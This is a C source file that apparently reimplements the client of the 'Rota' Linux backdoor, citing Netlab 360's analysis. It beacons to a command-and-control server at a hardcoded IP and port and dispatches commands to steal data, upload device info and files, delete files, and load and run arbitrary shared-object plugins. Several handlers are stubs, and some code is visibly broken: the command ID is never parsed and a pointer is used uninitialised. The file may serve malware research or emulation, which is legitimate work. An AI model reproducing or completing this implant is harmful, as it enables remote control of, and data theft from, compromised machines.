#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

#include "c2_commands.h"


// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
void c2_loop(){

    int sleepy_time = 3; // default C2 sleep time
    int sock;
    const char* server_name = "10.10.2.228";
    const int server_port = 1443;

    // setup sockets for initial packet
    struct sockaddr_in server_address;
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    inet_pton(AF_INET, server_name, &server_address.sin_addr);
    server_address.sin_port = htons(server_port);

    // on failure of connect/socket create, sleep and recrusively call ourselves.
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "could not create socket\n");
        sleep(3);
        c2_loop();
    }
    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        fprintf(stderr, "could not connect to server\n");
        sleep(3);
        c2_loop();
    }

    char *initial_pkt = initial_rota_pkt();
	send(sock, initial_pkt, 82, 0);

    while (1) {
        printf("(%d) In c2 loop...\n", getpid());

        // receive
        int n = 0;
        int len = 0, maxlen = 4096;
        char buffer[maxlen];

	// will remain open until the server terminates the connection
    while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
        //pbuffer += n;
        maxlen -= n;
        len += n;

        printf("Data received: %s\n", buffer);

        unsigned char cmd_id[4];

        // exit ==> 0x13 0x8E 0x3E 0x06
        if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run exiting!");
            #endif

            char *msg = "exiting!";
            send(sock, msg, strlen(msg), 0);
            c2_exit();
        }
        // perform a "PING"/"PONG" connectivity test
        else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 ping/png!");
            #endif

        }
        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 heartbeat!");
            #endif

        }
        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 set timeout!");
            #endif
            // TODO parse payload and update second parameter with new time.
            // having 10 seconds as a place holder for now.
            c2_set_timeout(&sleepy_time, 10);
        }
        else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run steal sensitive data\n");
            #endif

        }
        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run upload dev info\n");
            #endif

        }
        else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run upload\n");
            #endif

        }
        else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run query file\n");
            #endif

        }
        else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run delete file\n");
            #endif

        }
        else if (memcmp(&rota_c2_run_plugin_1, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run Plugin 1\n");
            #endif
        }
        else if (memcmp(&rota_c2_run_plugin_2, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run Plugin 2\n");
            #endif

        }
        else if (memcmp(&rota_c2_run_plugin_3, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run Plugin 3\n");
            #endif

        }

        sleep(sleepy_time);
        memset(buffer, 0, strlen(buffer));
    }

    sleep(sleepy_time);
    }

    free(initial_pkt);
    close(sock);
}


void c2_exit() {
    exit(0);
}

void c2_test() {
    // TODO: resolve embedded C2 domains and try to connect.
    // TODO: if this fails, what does the sample do?
}


void c2_heartbeat() {
    //TODO: what does Netlab mean by heartbeat funciton?
}


void c2_set_timeout(int *sleepTime, int newTime) {

    *sleepTime = newTime;
}


char *c2_steal_sensitive_info() {
    // TODO: identify what counts as 'sensitive info'

}


char *c2_upload_device_info() {
    // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...
    struct utsname *hostinfo;
    char *devinfo;
    int res  = uname(hostinfo);
    if (res != 0) {
        devinfo = (char *)malloc(strlen("unknown"));
        strncpy(devinfo, "unknown", strlen("unknown"));
    }

    // TODO - update here with c2 info
}


bool c2_query_file(char *fpath) {

    // TODO check how this is executed in the binary.
    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        return true;
    }

    return false;

}


bool c2_delete_file(char *fpath) {

    // TODO check how this is executed in the binary.
    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        int res = unlink(fpath);
        if (res == 0) {
            return true;
        } else {
            // non-zero return value indicating something went wrong deleting a file.
            return false;
        }
    }

    return false;
}


void c2_run_plugin_1(char *soPath, char *funcName) {

    void *handle = dlopen(soPath, RTLD_LAZY);
    void (*func_ptr)() = dlsym(handle, funcName);

    // execution of shared object
    func_ptr();
    dlclose(handle);
}


char *initial_rota_pkt() {

    char *rotaHdr = (char *)malloc(82);
    if (rotaHdr == NULL) {
        #ifdef DEBUG
        fprintf(stderr,"could not allocate data for rota header packet! Exiting!");
        exit(1);
        #endif
    }

    memset(rotaHdr, 0, 82);

    memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
    memcpy(&rotaHdr[4], payloadLen, sizeof(payloadLen));
    memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
    memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
    memcpy(&rotaHdr[27], cmd_id, sizeof(cmd_id));
    memcpy(&rotaHdr[66], marker_3, sizeof(marker_3));
    memcpy(&rotaHdr[77], marker_4, sizeof(marker_4));

    return rotaHdr;
}
